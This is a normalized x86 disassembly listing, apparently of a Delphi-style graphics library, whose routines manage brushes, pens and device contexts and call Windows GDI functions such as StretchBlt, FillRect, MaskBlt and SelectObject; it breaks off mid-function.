call sub_414328
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c7ac
xor eax eax
push ebp
push sub_41d344
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c7ac
xor eax eax
push ebp
push sub_41d327
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c1a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d32e
mov eax [ ebp - 0x8 ]
call sub_41c7bc
retn
sub_41d35c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41d378
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c7ac
xor eax eax
push ebp
push sub_41d3bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c12c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3c4
mov eax [ ebp - 0x4 ]
call sub_41c7bc
retn
sub_41d3c8
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41d378
add esp 0x10
pop edi
pop esi
retn
sub_41d3f4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d35c
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41d378
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41d428
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41bf80
xor edx edx
push ebp
push sub_41d4f5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41bf8c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c768
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41d510
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d35c
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41d378
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41d544
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030d4
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ca54
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41dd84
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cf80
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41dda4
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d24c
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41ddc4
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_414050
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41d608
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4140ec
xor edx edx
mov eax esi
call sub_41dbbc
mov eax [ esi + 0xc ]
call sub_403104
mov eax [ esi + 0x10 ]
call sub_403104
mov eax [ esi + 0x14 ]
call sub_403104
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4142fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41d664
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41dc10
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41d6ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
mov eax [ ebx + 0x14 ]
call sub_41d3ec
call sub_41c768
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c768
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_412938
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d798
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
mov eax [ ebx + 0x14 ]
call sub_41d428
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d7d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
mov eax [ ebx + 0x14 ]
call sub_41d428
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d810
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d870
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41d89c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d8d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41d91c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d958
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404114
push eax
mov eax edi
call sub_404314
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41d99c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d958
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d9b8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d958
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d9d8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41da24
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da2b
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41d848
sub_41da84
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41daa8
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41d870
pop ecx
pop edx
pop edi
pop esi
retn
sub_41dac8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41daf4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dc10
mov eax [ ebp + 0x8 ]
call sub_41c768
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41db5c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41dbbc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41db5c
mov edx esp
mov eax ebx
call sub_41da84
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41daa8
sub_41dc10
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41dcac
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
test bl 0x8
je r-xdata
mov eax esi
call sub_41dcd8
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41dd08
sub_41dcac
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41cc3c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c768
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41dcd8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41d13c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41dd08
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41d428
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41d428
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41d508
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41d3ec
call sub_41c768
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41d3ec
call sub_41c768
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41de38
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41de82
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de89
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_41de8c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41df28
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41de38
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4040c4
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df2f
lea eax [ ebp - 0x104 ]
call sub_403e54
retn
sub_41df44
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41e092
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41e001
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41de8c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41de8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e099
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41e0a4
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41e0d8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41df34
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41e358
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41df34
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e35f
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41df34
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41e1ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406820
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e35f
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41e36c
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41e3a4
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402b18
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41e41c
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41e474
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028b8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e571
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e578
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
